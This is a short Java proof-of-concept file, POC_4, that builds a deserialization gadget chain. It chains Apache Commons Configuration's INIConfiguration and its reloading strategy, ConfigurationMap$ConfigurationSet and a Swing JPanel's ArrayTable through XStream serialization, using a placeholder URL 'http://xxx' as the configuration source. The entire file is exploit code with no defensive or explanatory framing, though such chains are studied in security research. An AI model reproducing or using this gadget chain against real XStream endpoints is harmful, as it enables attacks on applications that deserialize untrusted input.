package com.example.CC;

import com.example.Utils.*;
import org.apache.commons.configuration.INIConfiguration;
import org.apache.commons.configuration.Lock;
import org.apache.commons.configuration.reloading.FileChangedReloadingStrategy;
import org.apache.commons.logging.impl.NoOpLog;

import javax.swing.*;
import java.net.URL;

public class POC_4 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {

        INIConfiguration fc = new INIConfiguration();
        FileChangedReloadingStrategy strategy = new FileChangedReloadingStrategy();
        ReflectionUtil.setField(strategy, "reloading", true);

        ReflectionUtil.setField(fc, "strategy", strategy);
        ReflectionUtil.setField(fc, "log", new NoOpLog());
        URL url = new URL("http://xxx");
        ReflectionUtil.setField(fc, "sourceURL", url);
        ReflectionUtil.setField(fc, "reloadLock", new Lock("AbstractFileConfiguration"));
        ReflectionUtil.setField(fc, "lockDetailEventsCount", new Object());
        ReflectionUtil.setField(fc, "detailEvents", -1);

        Object configuration1 = ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.configuration.ConfigurationMap$ConfigurationSet"));
        ReflectionUtil.setField(configuration1, "configuration", fc);

        Object configuration2 = ReflectionUtil.createWithoutConstructor(Class.forName("org.apache.commons.configuration.ConfigurationMap$ConfigurationSet"));
        ReflectionUtil.setField(configuration2, "configuration", fc);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{configuration1, "1", configuration2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);

        XStreamUtil.deserialize(XStreamUtil.serialize(j));
    }

}